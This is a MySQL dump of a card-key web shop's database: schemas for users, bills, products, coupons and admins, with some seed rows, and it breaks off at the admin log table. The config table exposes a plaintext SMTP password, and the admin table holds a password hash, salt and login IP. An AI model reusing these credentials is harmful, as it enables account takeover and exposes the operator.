-- MySQL dump 10.13  Distrib 8.0.33, for Linux (x86_64)
--
-- Host: localhost    Database: acgfk
-- ------------------------------------------------------
-- Server version	8.0.33

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `acg_bill`
--

DROP TABLE IF EXISTS `acg_bill`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_bill` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `owner` int unsigned NOT NULL COMMENT '用户id',
  `amount` decimal(10,2) unsigned NOT NULL COMMENT '金额',
  `balance` decimal(14,2) unsigned NOT NULL COMMENT '余额',
  `type` tinyint NOT NULL COMMENT '类型：0=支出，1=收入',
  `currency` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '货币：0=余额，1=硬币',
  `log` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '日志',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `type` (`type`) USING BTREE,
  CONSTRAINT `acg_bill_ibfk_1` FOREIGN KEY (`owner`) REFERENCES `acg_user` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_bill`
--

LOCK TABLES `acg_bill` WRITE;
/*!40000 ALTER TABLE `acg_bill` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_bill` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_business`
--

DROP TABLE IF EXISTS `acg_business`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_business` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` int unsigned NOT NULL COMMENT '用户id',
  `shop_name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '店铺名称',
  `title` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '浏览器标题',
  `notice` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '店铺公告',
  `service_qq` varchar(16) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '客服QQ',
  `service_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '网页客服链接',
  `subdomain` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '子域名',
  `topdomain` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '顶级域名',
  `master_display` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '主站显示：0=否，1=是',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `user_id` (`user_id`) USING BTREE,
  UNIQUE KEY `subdomain` (`subdomain`) USING BTREE,
  UNIQUE KEY `topdomain` (`topdomain`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_business`
--

LOCK TABLES `acg_business` WRITE;
/*!40000 ALTER TABLE `acg_business` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_business` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_business_level`
--

DROP TABLE IF EXISTS `acg_business_level`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_business_level` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '等级名称',
  `icon` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '图标',
  `cost` decimal(4,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '商家自己的商品，抽成百分比',
  `accrual` decimal(4,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '主站商品，分给商家的收益百分比',
  `substation` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '分站：0=关闭，1=启用',
  `top_domain` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '顶级域名：0=关闭，1=启用',
  `price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '购买价格',
  `supplier` tinyint unsigned NOT NULL DEFAULT '1' COMMENT '供货商权限：0=关闭，1=启用',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_business_level`
--

LOCK TABLES `acg_business_level` WRITE;
/*!40000 ALTER TABLE `acg_business_level` DISABLE KEYS */;
INSERT INTO `acg_business_level` VALUES (1,'体验版','/assets/static/images/business/v1.png',0.30,0.10,1,0,188.00,1),(3,'普通版','/assets/static/images/business/v2.png',0.25,0.15,1,0,288.00,1),(4,'专业版','/assets/static/images/business/v3.png',0.20,0.20,1,1,388.00,1);
/*!40000 ALTER TABLE `acg_business_level` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_card`
--

DROP TABLE IF EXISTS `acg_card`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_card` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `owner` int unsigned NOT NULL DEFAULT '0' COMMENT '所属会员：0=系统，其他等于会员UID',
  `commodity_id` int unsigned NOT NULL COMMENT '商品id',
  `draft` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '预选信息',
  `secret` varchar(760) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '卡密信息',
  `create_time` datetime NOT NULL COMMENT '添加时间',
  `purchase_time` datetime DEFAULT NULL COMMENT '购买时间',
  `order_id` int unsigned DEFAULT NULL COMMENT '订单id',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=未出售，1=已出售，2=已锁定',
  `note` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注信息',
  `race` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '商品种类',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `commodity_id` (`commodity_id`) USING BTREE,
  KEY `order_id` (`order_id`) USING BTREE,
  KEY `secret` (`secret`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  KEY `note` (`note`) USING BTREE,
  KEY `race` (`race`) USING BTREE,
  CONSTRAINT `acg_card_ibfk_1` FOREIGN KEY (`commodity_id`) REFERENCES `acg_commodity` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_card`
--

LOCK TABLES `acg_card` WRITE;
/*!40000 ALTER TABLE `acg_card` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_card` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_cash`
--

DROP TABLE IF EXISTS `acg_cash`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_cash` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` int unsigned NOT NULL COMMENT '用户id',
  `amount` decimal(14,2) unsigned NOT NULL COMMENT '提现金额',
  `type` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '类型：0=自动提现，1=手动提现',
  `card` tinyint unsigned NOT NULL COMMENT '收款：0=支付宝，1=微信',
  `create_time` datetime NOT NULL COMMENT '提现时间',
  `arrive_time` datetime DEFAULT NULL COMMENT '到账时间',
  `cost` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '手续费',
  `status` tinyint unsigned NOT NULL COMMENT '状态：0=处理中，1=成功，2=失败，3=冻结期',
  `message` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '消息',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `user_id` (`user_id`) USING BTREE,
  KEY `type` (`type`) USING BTREE,
  KEY `message` (`message`) USING BTREE,
  CONSTRAINT `acg_cash_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `acg_user` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_cash`
--

LOCK TABLES `acg_cash` WRITE;
/*!40000 ALTER TABLE `acg_cash` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_cash` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_category`
--

DROP TABLE IF EXISTS `acg_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_category` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '商品分类名称',
  `sort` smallint unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `owner` int unsigned NOT NULL DEFAULT '0' COMMENT '所属会员：0=系统，其他等于会员UID',
  `icon` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '分类图标',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=停用，1=启用',
  `hide` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '隐藏：1=隐藏，0=不隐藏',
  `user_level_config` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci COMMENT '会员配置',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `sort` (`sort`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_category`
--

LOCK TABLES `acg_category` WRITE;
/*!40000 ALTER TABLE `acg_category` DISABLE KEYS */;
INSERT INTO `acg_category` VALUES (1,'远程代搭，远程指导',0,'2023-04-30 16:53:39',0,'/favicon.ico',1,0,NULL),(2,'各地区服务器在售',1,'2023-04-30 16:53:27',0,'/assets/cache/images/202304301649552796063.png',1,0,NULL);
/*!40000 ALTER TABLE `acg_category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_commodity`
--

DROP TABLE IF EXISTS `acg_commodity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_commodity` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `category_id` int unsigned NOT NULL COMMENT '商品分类ID',
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '商品名称',
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '商品说明',
  `cover` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '商品封面图片',
  `factory_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '成本单价',
  `price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '商品单价(未登录)',
  `user_price` decimal(10,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '商品单价(会员价)',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=下架，1=上架',
  `owner` int unsigned NOT NULL DEFAULT '0' COMMENT '所属会员：0=系统，其他等于会员UID',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `api_status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT 'API对接：0=关闭，1=启用',
  `code` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL COMMENT '商品代码(API对接)',
  `delivery_way` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '发货方式：0=自动发货，1=手动发货/插件发货',
  `delivery_auto_mode` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '自动发卡模式：0=旧卡先发，1=随机发卡，2=新卡先发',
  `delivery_message` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '手动发货显示信息',
  `contact_type` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '联系方式：0=任意，1=手机，2=邮箱，3=QQ',
  `password_status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '订单密码：0=关闭，1=启用',
  `sort` smallint unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `coupon` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '优惠卷：0=关闭，1=启用',
  `shared_id` int unsigned DEFAULT NULL COMMENT '共享平台ID',
  `shared_code` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '共享平台-商品代码',
  `shared_premium` float(10,2) unsigned DEFAULT '0.00' COMMENT '商品加价',
  `shared_premium_type` tinyint unsigned DEFAULT '0' COMMENT '加价模式',
  `seckill_status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '商品秒杀：0=关闭，1=开启',
  `seckill_start_time` datetime DEFAULT NULL COMMENT '秒杀开始时间',
  `seckill_end_time` datetime DEFAULT NULL COMMENT '秒杀结束时间',
  `draft_status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '指定卡密购买：0=关闭，1=启用',
  `draft_premium` decimal(10,2) unsigned DEFAULT '0.00' COMMENT '指定卡密购买时溢价',
  `inventory_hidden` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '隐藏库存：0=否，1=是',
  `leave_message` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '发货留言',
  `recommend` tinyint unsigned DEFAULT '0' COMMENT '推荐商品：0=否，1=是',
  `send_email` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '发送邮件：0=否，1=是',
  `only_user` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '限制登录购买：0=否，1=是',
  `purchase_count` int unsigned NOT NULL DEFAULT '0' COMMENT '限制购买数量：0=无限制',
  `widget` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '控件',
  `level_price` text CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci COMMENT '会员等级-定制价格',
  `level_disable` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '禁用会员等级折扣，0=关闭，1=启用',
  `minimum` int unsigned NOT NULL DEFAULT '0' COMMENT '最低购买数量，0=无限制',
  `maximum` int unsigned NOT NULL DEFAULT '0' COMMENT '最大购买数量，0=无限制',
  `shared_sync` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '同步平台价格：0=关，1=开',
  `config` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci COMMENT '配置文件',
  `hide` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '隐藏：1=隐藏，0=不隐藏',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `code` (`code`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  KEY `sort` (`sort`) USING BTREE,
  KEY `category_id` (`category_id`) USING BTREE,
  KEY `shared_id` (`shared_id`) USING BTREE,
  KEY `seckill_status` (`seckill_status`) USING BTREE,
  KEY `api_status` (`api_status`) USING BTREE,
  KEY `recommend` (`recommend`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_commodity`
--

LOCK TABLES `acg_commodity` WRITE;
/*!40000 ALTER TABLE `acg_commodity` DISABLE KEYS */;
INSERT INTO `acg_commodity` VALUES (1,1,'远程代搭，远程指导','<h1 id=\"8eujk\" style=\"text-align:center;\">注意！！！</h1><h2 id=\"cxnia\" style=\"text-align:center;\">最终价格是多少，数量就填多少！</h2>','/favicon.ico',0.00,1.00,1.00,1,0,'2023-04-30 16:51:49',0,'8AE80574F3CA98BE',1,0,'购买后联系公告的机器人?',2,1,1,0,NULL,'',0.00,0,0,NULL,NULL,0,0.00,0,'购买后联系公告的机器人！',0,1,0,0,'[]',NULL,1,50,0,0,'',0),(2,2,'各地区服务器在售','<h1 id=\"hqp8s\" style=\"text-align:center;\">注意！！！</h1><h2 style=\"text-align:center;\"><b id=\"nwydj\">最终价格是多少，数量就填多少！</b></h2>','/favicon.ico',0.00,1.00,1.00,1,0,'2023-04-30 16:50:40',0,'0465B0D50457501A',1,0,'购买后联系公告的机器人?',2,1,1,0,NULL,'',0.00,0,0,NULL,NULL,0,0.00,0,'购买后联系公告的机器人！',0,1,0,0,'[]',NULL,1,50,0,0,'',0);
/*!40000 ALTER TABLE `acg_commodity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_config`
--

DROP TABLE IF EXISTS `acg_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_config` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL COMMENT '配置键名称',
  `value` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '配置内容',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `key` (`key`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=46 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_config`
--

LOCK TABLES `acg_config` WRITE;
/*!40000 ALTER TABLE `acg_config` DISABLE KEYS */;
INSERT INTO `acg_config` VALUES (1,'shop_name','Fun☁️商城'),(2,'title','Fun☁️商城'),(3,'description','你想要的我这里都有！'),(4,'keywords','Fun☁️商城'),(14,'user_theme','Cartoon'),(5,'registered_state','0'),(6,'registered_type','0'),(7,'registered_verification','0'),(8,'registered_phone_verification','0'),(9,'registered_email_verification','0'),(10,'sms_config','{\"accessKeyId\":\"\",\"accessKeySecret\":\"\",\"signName\":\"\",\"templateCode\":\"\"}'),(11,'email_config','{\"smtp\":\"mail.fun513.gq\",\"secure\":\"0\",\"port\":\"465\",\"username\":\"support@fun513.gq\",\"password\":\"ryan1995\"}'),(12,'login_verification','0'),(13,'forget_type','0'),(15,'notice','<p style=\"text-align:center;\"><b><font color=\"#f9963b\">有问题联系售后，</font></b></p><p style=\"text-align:center;\"><b><font color=\"#f9963b\">售后群</font></b><a href=\"https://t.me/fun513/\" target=\"_blank\" style=\"font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;PingFang SC&quot;, Tahoma, Arial, sans-serif; font-size: 14px; text-align: var(--bs-body-text-align);\">Fun☁️</a><b style=\"font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;PingFang SC&quot;, Tahoma, Arial, sans-serif; text-align: var(--bs-body-text-align);\"><font color=\"#f9963b\">，</font></b></p><p style=\"text-align:center;\"><a href=\"https://t.me/fun_dmbot\" target=\"_blank\" style=\"font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;PingFang SC&quot;, Tahoma, Arial, sans-serif; font-size: 14px; text-align: var(--bs-body-text-align);\">售后机器人?</a><b style=\"text-align: var(--bs-body-text-align); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;PingFang SC&quot;, Tahoma, Arial, sans-serif;\"><font color=\"#f9963b\">。</font></b></p><p><b><font color=\"#f9963b\"><br/></font></b></p>'),(16,'trade_verification','0'),(17,'recharge_welfare','0'),(18,'recharge_welfare_config',''),(19,'promote_rebate_v1','0.1'),(20,'promote_rebate_v2','0.2'),(21,'promote_rebate_v3','0.3'),(22,'substation_display','1'),(24,'domain',''),(25,'service_qq',''),(26,'service_url',''),(27,'cash_type_alipay','1'),(28,'cash_type_wechat','1'),(29,'cash_cost','5'),(30,'cash_min','100'),(31,'cname',''),(32,'background_url','https://www.dmoe.cc/random.php'),(33,'default_category','0'),(34,'substation_display_list','[]'),(35,'closed','0'),(36,'closed_message','我们正在升级，请耐心等待完成。'),(37,'recharge_min','10'),(38,'recharge_max','1000'),(39,'user_mobile_theme','0'),(40,'commodity_recommend','0'),(41,'commodity_name','推荐'),(42,'background_mobile_url',''),(43,'username_len','6'),(44,'cash_type_balance','0'),(45,'callback_domain','');
/*!40000 ALTER TABLE `acg_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_coupon`
--

DROP TABLE IF EXISTS `acg_coupon`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_coupon` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `code` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '优惠卷代码',
  `commodity_id` int unsigned NOT NULL COMMENT '商品id',
  `owner` int unsigned NOT NULL DEFAULT '0' COMMENT '所属会员：0=系统，其他等于会员UID',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `expire_time` datetime DEFAULT NULL COMMENT '过期时间',
  `service_time` datetime DEFAULT NULL COMMENT '使用时间',
  `money` decimal(10,2) unsigned NOT NULL COMMENT '抵扣金额',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=未使用，1=已使用，2=锁定',
  `trade_no` char(22) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '订单号',
  `note` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注信息',
  `mode` tinyint unsigned DEFAULT '0' COMMENT '抵扣模式',
  `category_id` int unsigned DEFAULT '0' COMMENT '商品分类ID',
  `life` int unsigned NOT NULL DEFAULT '1' COMMENT '卡密使用寿命',
  `use_life` int unsigned NOT NULL DEFAULT '0' COMMENT '已使用次数',
  `race` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '商品类别',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `code` (`code`) USING BTREE,
  KEY `commodity_id` (`commodity_id`) USING BTREE,
  KEY `owner` (`owner`) USING BTREE,
  KEY `create_time` (`create_time`) USING BTREE,
  KEY `money` (`money`) USING BTREE,
  KEY `status` (`status`) USING BTREE,
  KEY `order_id` (`trade_no`) USING BTREE,
  KEY `note` (`note`) USING BTREE,
  KEY `race` (`race`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_coupon`
--

LOCK TABLES `acg_coupon` WRITE;
/*!40000 ALTER TABLE `acg_coupon` DISABLE KEYS */;
/*!40000 ALTER TABLE `acg_coupon` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_manage`
--

DROP TABLE IF EXISTS `acg_manage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_manage` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL COMMENT '邮箱',
  `password` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL COMMENT '密码',
  `security_password` varchar(64) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '安全密码',
  `nickname` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '昵称',
  `salt` varchar(32) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci NOT NULL COMMENT '盐',
  `avatar` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '头像',
  `status` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '状态：0=冻结，1=正常',
  `type` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '类型：0=系统账号，1=普通账号(全天)，2=日间账号，3=夜间账号',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `login_time` datetime DEFAULT NULL COMMENT '登录时间',
  `last_login_time` datetime DEFAULT NULL COMMENT '上一次登录时间',
  `login_ip` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '登录IP',
  `last_login_ip` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '上一次登录IP',
  `note` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `username` (`email`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_manage`
--

LOCK TABLES `acg_manage` WRITE;
/*!40000 ALTER TABLE `acg_manage` DISABLE KEYS */;
INSERT INTO `acg_manage` VALUES (1,'admin@fun.com','168c08145178fe9925e0f5e603905eba95188779',NULL,'你挺能闹啊?','a0574508e2f022700a9599bb323e6c9d','/favicon.ico',1,0,'1997-01-01 00:00:00','2023-06-24 12:10:52','2023-06-24 11:38:33','89.208.248.175','89.208.248.175',NULL);
/*!40000 ALTER TABLE `acg_manage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `acg_manage_log`
--

DROP TABLE IF EXISTS `acg_manage_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `acg_manage_log` (
  `id` int unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `email` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '管理员邮箱',
  `nickname` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '管理员呢称',
  `content` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '日志内容',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  `create_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT 'IP地址',
  `ua` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '浏览器UA',
  `risk` tinyint unsigned NOT NULL DEFAULT '0' COMMENT '风险：0=正常，1=异常',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `create_ip` (`create_ip`) USING BTREE,
  KEY `create_time` (`create_time`) USING BTREE,
  KEY `risk` (`risk`) USING BTREE,
  KEY `email` (`email`) USING BTREE,
  KEY `nickname` (`nickname`) USING BTREE,
  KEY `content` (`content`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `acg_manage_log`
--

LOCK TABLES `acg_manage_log` WRITE;
/*!40000 ALTER TABLE `acg_manage_log` DISABLE KEYS */;
